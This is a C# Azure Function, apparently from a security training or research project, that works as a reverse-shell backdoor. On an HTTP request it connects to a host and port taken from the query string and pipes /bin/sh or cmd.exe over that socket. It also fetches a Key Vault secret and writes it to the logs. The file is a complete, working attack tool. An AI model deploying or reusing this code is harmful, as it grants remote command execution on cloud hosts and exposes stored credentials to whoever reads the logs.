/*
References:
https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Threading.Tasks;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using Azure.Security.KeyVault.Secrets;
using Azure.Identity;
using Microsoft.AspNetCore.Mvc;

namespace Puma.Security.Functions.Azure
{
    public static class Cougar
    {
        static StreamWriter streamWriter;
        static ILogger logger;

        [FunctionName("Cougar")]
        public static async Task<IActionResult> Run(
            [HttpTrigger(AuthorizationLevel.Function, "get", Route = null)] HttpRequest req,
            ILogger log)
        {
            logger = log;

            // Audit logging
            logger.LogInformation(1, "Startup: The Cougar is running.");

            try
            {
                var secret = getSecret();
                // NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
                // DEBUG ONLY: Make sure it found the value
                logger.LogInformation(8, $"Secret value: {secret}");
            }
            catch (Exception err)
            {
                logger.LogInformation(4, err.ToString());
                logger.LogInformation(8, "Skipping secret read routine.");
            }

            string host = req.Query["host"];
            string port = req.Query["port"];

            if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(port))
            {
                logger.LogInformation(2, "Invalid request: Missing host or port parameter.");
                return new BadRequestObjectResult(new { message = "Must provide the host and port for the target TCP server as query parameters." });
            }

            // Parse port number
            int portNum;
            if (!int.TryParse(port, out portNum))
            {
                logger.LogInformation(2, $"Invalid request: Port number {port} is not valid.");
                return new BadRequestObjectResult(new { message = "Port number must be an integer." });
            }

            try
            {
                using (TcpClient client = new TcpClient(host, portNum))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder();

                            Process p = new Process();
                            p.StartInfo.FileName = File.Exists("/bin/sh") ? "/bin/sh" : "cmd.exe";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(cmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();

                            while (true)
                            {
                                string line = rdr.ReadLine();

                                if (line == null)
                                {
                                    break;
                                }

                                strInput.Append(line);
                                p.StandardInput.WriteLine(strInput.ToString());
                                strInput.Remove(0, strInput.Length);
                            }

                            logger.LogInformation(3, "Connection terminated from client.");
                            logger.LogInformation(5, "Shutdown: The Cougar is tired.");
                            return new InternalServerErrorObjectResult(new { message = "Connection terminated from client." });
                        }
                    }
                }
            }
            catch (Exception err)
            {
                logger.LogInformation(4, err.ToString());
                return new InternalServerErrorObjectResult(new { message = err.ToString() });
            }
        }

        private static string getSecret()
        {
            // Get vault URL from env
            var keyVaultUrl = Environment.GetEnvironmentVariable("COUGAR_KEY_VAULT_URL");
            var secretName = Environment.GetEnvironmentVariable("COUGAR_SECRET_NAME");

            if (string.IsNullOrEmpty(keyVaultUrl))
                return string.Empty;

            // Pull secret from the vault
            var client = new SecretClient(vaultUri: new Uri(keyVaultUrl), credential: new DefaultAzureCredential());
            var secret = client.GetSecret(secretName);
            return secret.Value.Value;
        }

        private static void cmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput.ToString());
                    streamWriter.Flush();
                }
                catch (Exception err)
                {
                    logger.LogInformation(6, $"Error writing output: {err}");
                }
            }
        }
    }
}
